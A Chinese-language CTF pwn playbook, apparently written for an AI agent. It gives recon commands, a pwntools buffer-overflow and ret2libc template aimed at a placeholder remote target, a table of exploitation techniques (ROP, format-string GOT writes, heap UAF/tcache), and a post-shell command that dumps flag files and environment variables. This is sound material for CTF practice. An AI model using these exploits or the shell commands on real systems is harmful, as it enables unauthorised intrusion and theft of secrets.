# Pwn 二进制漏洞利用 playbook

## 0. 铁律(实测教训)
1. **一律在 `orb -m pwn64` 里做** —— 本机 macOS arm64 跑不了 amd64 二进制。
2. **先直接打远程**,不要一上来就搭本地复现环境(改 ld.so、LD_PRELOAD、找匹配 libc 那套极费时;
   实测有 agent 在这上面耗掉 10 分钟还没开始打)。远程行为异常时才用 gdb 定点调试。
3. 题目给了 libc 就直接用它算偏移,别猜版本。

## 1. 标准流程
```bash
orb -m pwn64 bash -lc 'cd <工作区>/files && checksec --file=./chall && file ./chall'
orb -m pwn64 bash -lc 'readelf -s ./chall | head -30; strings -a ./chall | grep -iE "flag|sh|system"'
orb -m pwn64 bash -lc 'objdump -d ./chall | grep -A12 "<main>:"'      # 找溢出点
orb -m pwn64 bash -lc 'ROPgadget --binary ./chall | grep -E "pop rdi|pop rsi|pop rdx|leave|syscall" | head'
```

## 2. pwntools 模板(改就用)
```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')
elf  = ELF('./chall')
libc = ELF('./libc.so.6') if os.path.exists('./libc.so.6') else None
io = remote('TARGET_IP', TARGET_PORT)          # 容器题地址按平台给的填
io.recvuntil(b'> ')
payload = b'A'*0x50 + p64(0x400783)
io.sendline(payload)
io.interactive()
```
关键几行:泄露 `leak = u64(io.recvline().strip().ljust(8, b'\x00'))`;libc 基址 `base = leak - libc.symbols['puts']`;
`system = base + libc.symbols['system']`;`binsh = base + next(libc.search(b'/bin/sh'))`;栈对齐用 `ret` 垫一下。

## 3. 题型对照
| 检查结果 | 打法 |
|---|---|
| 无 PIE 无 canary + 溢出 | ret2text / ret2libc(泄露 → 算 system → getshell) |
| 有 canary | 泄露 canary(格式化字符串 / write 溢出读),或 `__stack_chk_fail` |
| 没有 system/bin/sh | ROP 拼 execve 或 syscall;有 seccomp 只能 open/read/write |
| 格式化字符串 | `%p` 泄露、`%n` 任意写(GOT 表)、`%s` 读内存 |
| 堆题 | tcache/fastbin dup、UAF、`__free_hook`/`__malloc_hook`(glibc<2.34) |
| 32 位 | 参数走栈,`pop;pop;ret` 依次压参 |

## 4. 调试
```bash
orb -m pwn64 bash -lc 'gdb -q ./chall -ex "b *main+0" -ex r'
orb -m pwn64 bash -lc 'gdb -q ./chall -ex "run < in.txt" -ex "bt" -ex "info registers"'
```

## 5. 收尾(省轮次)
拿到 shell 后一次性全打:`id; ls -la; cat flag* /flag /flag.txt 2>/dev/null; env | grep -i flag`。
